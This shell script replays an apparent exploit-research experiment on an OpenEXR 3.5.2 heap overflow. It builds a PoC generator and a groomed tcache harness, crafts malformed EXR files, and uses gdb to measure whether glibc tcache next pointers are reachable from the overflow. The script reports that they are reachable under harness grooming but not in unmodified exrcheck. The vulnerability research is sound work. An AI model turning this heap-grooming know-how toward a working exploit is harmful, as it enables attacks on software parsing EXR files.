#!/bin/sh
# W188: one-command replay of the tcache-reach boundary at the pinned sink.
#
# POSITIVE CONTROL (detector sensitivity): the W187 -no-pie harness grooms a
# freed 0x3f0 chunk immediately after the 256-byte unpacked_buffer.  At entry
# to sort2_4ByteChannels_tiled, tcache[0x3f0] has a chunk at dst+272, i.e. in
# the 384-byte copy window; the fully file-chosen COPY2 reaches its next ptr.
#
# NEGATIVE (the new result): in UNMODIFIED upstream exrcheck -c, with the same
# fully file-chosen PoC and with the W186 size-word PoC, the only tcache chunk
# live at the sink is a 0x90 chunk thousands of bytes past the window.  No
# tcache next pointer is reachable, so W187's address steering needs harness
# grooming that the file alone does not supply.
#
# All paths use equal-length filenames so the observed offsets are comparable.
# No pointer/IP, command, marker, wire or witness verdict is claimed.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed evidence

if [ ! -x bin-vuln-plain/gen_baseline_deep_mixed ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    g++ -g -O1 $INC cases/gen_baseline_deep_mixed.cpp $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lm \
        -o bin-vuln-plain/gen_baseline_deep_mixed
fi

if [ ! -x bin-vuln-plain/tcache_harness ]; then
    BUILD=build-vuln-plain
    SRC=src/openexr-3.5.2
    CORE="$BUILD/src/lib/OpenEXRCore"
    GEN="$BUILD/cmake"
    IMATH_COMPAT="$BUILD/OpenEXR_ImathIncludeCompat"
    IMATH_CONFIG="$BUILD/_deps/imath-build/config"
    IMATH_SRC="$BUILD/_deps/imath-src/src"
    OPENEXR_SRC="$SRC/src/lib"
    LIBS="$BUILD/src/lib/OpenEXRUtil/libOpenEXRUtil*.a $BUILD/src/lib/OpenEXR/libOpenEXR-3_5*.a $BUILD/src/lib/OpenEXRCore/libOpenEXRCore*.a $BUILD/src/lib/IlmThread/libIlmThread*.a $BUILD/src/lib/Iex/libIex*.a"
    IMATH_LIB=$(find "$BUILD/_deps" -name 'libImath*.a' | sort | tr '\n' ' ')
    INC="-I$CORE -I$SRC/src/lib/OpenEXRCore -I$GEN -I$IMATH_COMPAT -I$IMATH_CONFIG -I$IMATH_SRC -I$OPENEXR_SRC/OpenEXR -I$OPENEXR_SRC/Iex -I$OPENEXR_SRC/IlmThread"
    gcc -g -O1 -no-pie $INC harness/tcache_harness.c $LIBS $IMATH_LIB \
        -ldeflate -lzstd -lz -lpthread -lstdc++ -lm \
        -o bin-vuln-plain/tcache_harness
fi

BASE=work-mixed/baseline_deep_mixed.exr
C0=work-mixed/w188-c0.exr
C1=work-mixed/w188-c1.exr
C2=work-mixed/w188-c2.exr
bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > /dev/null
cp "$BASE" "$C0"
python3 cases/make_poc_mixed_full.py "$BASE" "$C1" 64 0x5a 256 > /dev/null
python3 cases/make_size_word_poc.py "$BASE" "$C2" 0x41 > /dev/null

hash() { sha256sum "$1" | cut -d' ' -f1; }
test "$(hash "$C0")" = \
    9aa2073dce40b893f648f0fb078b738538e65a569cb00079d4128612e7fa3d04
test "$(hash "$C1")" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7
test "$(hash "$C2")" = \
    76db069d0677e5f9bfb87336a9c3a69a54e1dac2499248129339cc705da73e1e

probe() { # label binary [args...]
    label=$1; bin=$2; shift 2
    gdb -q -batch \
        -ex 'set pagination off' -ex 'set confirm off' \
        -ex 'set disable-randomization on' \
        -ex 'break sort2_4ByteChannels_tiled' -ex "run $*" \
        -x harness/tcache-reach.cmd "$bin" 2>&1 \
        | grep -E '^(BASE|TCACHE idx|FINISHED)' \
        | sed -E 's/(BASE=0x|tcache=0x)[0-9a-f]+/\1NORM/g' \
        > "evidence/tcache-reach-$label.out"
}

run_all() {
    probe harness bin-vuln-plain/tcache_harness "$C1"
    probe c0 build-vuln-plain/bin/exrcheck -c "$C0"
    probe c1 build-vuln-plain/bin/exrcheck -c "$C1"
    probe c2 build-vuln-plain/bin/exrcheck -c "$C2"
}

check_all() {
    grep -Fqx 'TCACHE idx=61 size=0x3f0 n=7 head_off=+7744 hits=[(5, 272)]' \
        evidence/tcache-reach-harness.out
    grep -Fqx 'TCACHE idx=7 size=0x90 n=1 head_off=+4448 hits=[]' \
        evidence/tcache-reach-c0.out
    grep -Fqx 'TCACHE idx=7 size=0x90 n=1 head_off=+4288 hits=[]' \
        evidence/tcache-reach-c1.out
    grep -Fqx 'TCACHE idx=7 size=0x90 n=1 head_off=+4288 hits=[]' \
        evidence/tcache-reach-c2.out
    for f in harness c0 c1 c2; do
        grep -Fqx 'FINISHED' "evidence/tcache-reach-$f.out"
    done
    test "$(grep -c '^TCACHE' evidence/tcache-reach-harness.out)" -eq 2
    for f in c0 c1 c2; do
        test "$(grep -c '^TCACHE' "evidence/tcache-reach-$f.out")" -eq 1
    done
}

run_all
check_all
sha256sum evidence/tcache-reach-*.out > work-mixed/w188-pass1.sha
for pass in 2 3; do
    run_all
    check_all
    sha256sum evidence/tcache-reach-*.out > "work-mixed/w188-pass$pass.sha"
    cmp work-mixed/w188-pass1.sha "work-mixed/w188-pass$pass.sha"
done

printf 'RESULT PASS\n'
sha256sum evidence/tcache-reach-*.out
